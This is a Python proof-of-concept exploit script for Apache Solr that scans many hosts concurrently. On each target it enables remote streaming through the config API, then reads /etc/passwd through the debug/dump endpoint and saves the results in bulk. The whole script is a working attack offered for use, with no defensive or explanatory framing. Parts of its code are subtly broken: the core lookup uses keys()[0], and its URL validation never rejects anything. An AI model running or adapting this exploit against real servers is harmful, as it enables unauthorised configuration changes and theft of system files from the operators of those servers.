#!/usr/bin/python
# coding: UTF-8
import argparse
import asyncio
import json
import pathlib
from typing import Tuple
from urllib.parse import urlparse

import httpx


class URLAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        if not urlparse(values):
            raise ValueError("Not a valid url!")
        setattr(namespace, self.dest, values)


class FILEAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        if not pathlib.Path(values).exists():
            raise ValueError("File not exists!")
        setattr(namespace, self.dest, values)


parser = argparse.ArgumentParser(description="Solr Poc")
parser.add_argument("--host", type=str, action=URLAction, help="target host uri")
parser.add_argument("--file", type=str, action=FILEAction, help="target host file")
parser.add_argument("--conn", type=int, default=10, help="asyncio max connetions")
args = parser.parse_args()


SEM = asyncio.Semaphore(args.conn)
RESULT = {}


async def check(host: str) -> Tuple[str, bool]:
    status = False
    async with SEM:
        async with httpx.AsyncClient(base_url=host) as client:
            try:
                core_data = (
                    await client.get(
                        "/solr/admin/cores?indexInfo=false&wt=json", timeout=3
                    )
                ).json()
            except httpx.ReadTimeout:
                print(f"{host} TimeOut!")
                status = "TimeOut"
            else:
                if (status := core_data["status"]) :
                    core = status.keys()[0]
                    await client.post(
                        f"/solr/{core}/config",
                        json={
                            "set-property": {
                                "requestDispatcher.requestParsers.enableRemoteStreaming": "true"
                            }
                        },
                    )
                    result_data = (
                        await client.post(
                            url=f"/solr/{core}/debug/dump?param=ContentStreams",
                            data={"stream.url": "file:///etc/passwd"},
                        )
                    ).json()
                    if (streams := result_data["streams"]) :
                        print(streams[0]["stream"])
                        status = True
            finally:
                RESULT[host] = status
                return host, status


async def loop(urls):
    await asyncio.gather(*list(map(check, urls)))


def main():
    result_file = pathlib.Path("solr_main.json")
    try:
        urls = set()
        if args.host:
            urls.add(args.host)
        if args.file:
            with pathlib.Path(args.file).open("r") as file:
                urls = urls.union(
                    {url for line in file if urlparse((url := line.strip()))}
                )
        print(f"tasks: {len(urls)}")
        asyncio.run(loop(urls))
    except KeyboardInterrupt:
        pass
    finally:
        with result_file.open("w") as file:
            file.write(json.dumps(RESULT, indent=4, ensure_ascii=True))


if __name__ == "__main__":
    main()
